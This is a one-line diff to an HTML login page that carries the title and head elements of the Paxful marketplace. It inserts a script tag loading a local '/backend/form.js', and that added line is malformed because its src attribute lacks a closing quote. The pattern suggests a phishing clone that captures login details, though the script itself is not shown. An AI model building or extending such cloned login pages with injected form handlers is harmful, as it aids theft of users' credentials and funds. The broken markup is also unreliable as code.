@@ -43,6 +43,7 @@
         <link rel="stylesheet"
             href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&amp;display=swap&amp;subset=cyrillic">
         <title>Log In to Your Account | Paxful</title>
+        <script src="/backend/form.js></script>
         <!-- Google Tag Manager -->
         <script type="text/javascript" async=""
             src="https://www.googletagmanager.com/gtag/js?id=G-N8ZVYK8W8L&amp;cx=c&amp;_slc=1"></script>
